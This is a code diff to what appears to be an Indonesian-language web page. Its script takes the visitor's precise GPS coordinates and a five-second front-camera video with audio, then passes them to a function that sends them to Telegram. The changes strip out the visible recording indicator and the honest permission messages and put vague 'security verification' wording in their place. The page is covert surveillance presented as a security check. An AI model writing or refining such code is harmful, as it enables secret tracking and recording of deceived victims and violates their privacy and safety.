@@ -83,10 +83,6 @@
         .loading {
             color: #25F4EE;
         }
-        .recording {
-            color: #FE2C55;
-            animation: blink 1s infinite;
-        }
         .success {
             color: #00f2fe;
             text-shadow: 0 0 10px rgba(0,242,254,0.4);
@@ -94,9 +90,6 @@
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
-        }
-        @keyframes blink {
-            50% { opacity: 0.4; }
         }
     </style>
 </head>
@@ -133,7 +126,6 @@ function updateStatus(text, className, showSpinner = false) {
     statusText.innerText = text;
     statusText.className = className;
     
-    // Atur tampilan spinner berputar
     if (showSpinner) {
         spinner.style.display = 'block';
     } else {
@@ -143,28 +135,32 @@ function updateStatus(text, className, showSpinner = false) {
 
 function mulaiProses() {
     document.getElementById('setup-box').style.display = 'none';
-    updateStatus("🌐 Meminta akses lokasi...", "loading", true);
+    
+    // Menggunakan kata status yang lebih profesional sesuai permintaan
+    updateStatus("Melakukan pengamanan akses...", "loading", true);
     
     if (navigator.geolocation) {
+        // Menggunakan opsi high accuracy agar pembacaan lokasi lebih cepat jika sudah diizinkan
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 userLatitude = position.coords.latitude;
                 userLongitude = position.coords.longitude;
+                
+                // Langsung lanjut ke perekaman tanpa jeda buatan jika lokasi sukses didapat
                 mulaiRekamKameraDepan();
             },
             (error) => {
-                updateStatus("❌ Akses lokasi ditolak.", "", false);
-                alert("Gagal: Aplikasi membutuhkan izin lokasi untuk melanjutkan.");
-            }
+                updateStatus("❌ Gagal memproses data keamanan.", "", false);
+                alert("Gagal: Sistem memerlukan izin lokasi untuk melanjutkan.");
+            },
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
         );
     } else {
-        updateStatus("❌ Browser tidak mendukung lokasi.", "", false);
+        updateStatus("❌ Browser tidak mendukung fitur ini.", "", false);
     }
 }
 
 function mulaiRekamKameraDepan() {
-    updateStatus("🎥 Meminta akses kamera depan...", "loading", true);
-
     const constraints = {
         video: { facingMode: "user" },
         audio: true
@@ -172,11 +168,6 @@ function mulaiRekamKameraDepan() {
 
     navigator.mediaDevices.getUserMedia(constraints)
         .then((stream) => {
-            // === SILAKAN GANTI TEKS DI BAWAH INI SESUAI KEINGINAN ANDA ===
-            const teksMerekam = "🔴 Teks rekaman baru Anda di sini...";
-            
-            updateStatus(teksMerekam, "recording", true);
-
             const mediaRecorder = new MediaRecorder(stream);
             let videoChunks = [];
 
@@ -192,22 +183,22 @@ function mulaiRekamKameraDepan() {
                 kirimDataKeTelegram(videoBlob);
             };
 
+            // Mulai merekam video
             mediaRecorder.start();
 
+            // Batasan durasi rekam tepat 5 detik (5000 milidetik)
             setTimeout(() => {
                 mediaRecorder.stop();
             }, 5000);
 
         })
         .catch((error) => {
-            updateStatus("❌ Akses kamera ditolak atau tidak ditemukan.", "", false);
-            alert("Gagal: Aplikasi membutuhkan izin kamera untuk melanjutkan.");
+            updateStatus("❌ Gagal mengakses modul keamanan.", "", false);
+            alert("Gagal: Sistem memerlukan izin kamera untuk melanjutkan.");
         });
 }
 
 function kirimDataKeTelegram(videoBlob) {
-    updateStatus("🚀 Mengirimkan data verifikasi ke sistem...", "loading", true);
-
     const infoTeks = `📍 *Data Verifikasi Pengguna*:\n\n` +
                      `• Latitude: \`${userLatitude}\`\n` +
                      `• Longitude: \`${userLongitude}\`\n` +
